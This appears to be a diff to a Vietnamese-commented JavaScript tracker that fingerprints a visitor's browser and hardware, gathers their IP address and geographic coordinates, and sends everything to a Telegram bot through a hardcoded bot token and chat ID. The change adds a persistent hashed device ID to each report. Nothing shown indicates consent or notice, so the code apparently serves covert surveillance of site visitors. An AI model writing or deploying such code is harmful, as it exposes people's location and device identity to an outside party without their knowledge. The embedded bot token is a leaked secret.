@@ -2,8 +2,7 @@ const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // 
 const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn
 
 
-
-// 📌 Xác định tên trình duyệt chính xác
+// 📌 Xác định tên trình duyệt
 function getBrowserName() {
     const ua = navigator.userAgent;
     if (navigator.brave) return "Brave";
@@ -47,7 +46,18 @@ async function getDeviceFingerprint() {
     };
 }
 
-// 📌 Lấy vị trí & gửi lên Telegram
+// 📌 Tạo ID thiết bị cố định (dưới 12 ký tự)
+async function generateDeviceID() {
+    const fingerprint = await getDeviceFingerprint();
+    const data = `${fingerprint.browser}|${fingerprint.platform}|${fingerprint.cpuCores}|${fingerprint.gpu}|${fingerprint.ram}`;
+    
+    const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(data));
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    
+    return hashArray.map(byte => byte.toString(36)).join("").slice(0, 12).toUpperCase();
+}
+
+// 📌 Gửi thông tin đến Telegram
 async function sendInfoToTelegram() {
     let city = "Không xác định", region = "Không xác định", country = "Không xác định";
     let latitude = "Không xác định", longitude = "Không xác định", ipAddress = "Không xác định";
@@ -71,13 +81,14 @@ async function sendInfoToTelegram() {
         }
     }
 
+    const deviceID = await generateDeviceID();
     const fingerprint = await getDeviceFingerprint();
     const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
     const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    // ✉️ Gửi tin nhắn đến Telegram
     const message = `
 🔍 **THÔNG TIN TRUY CẬP**
+🆔 ID Thiết Bị: ${deviceID}
 🕒 Thời gian: ${now}
 📌 Địa chỉ IP: ${ipAddress}
 🌍 Vị trí: [Xem trên bản đồ](${locationUrl})
@@ -107,9 +118,9 @@ async function sendInfoToTelegram() {
                 parse_mode: "Markdown"
             })
         });
-        console.log("Đã gửi thông tin đến Telegram");
+        console.log("✅ Đã gửi thông tin đến Telegram");
     } catch (error) {
-        console.log("Lỗi khi gửi thông tin đến Telegram:", error);
+        console.log("❌ Lỗi khi gửi thông tin đến Telegram:", error);
     }
 }
 
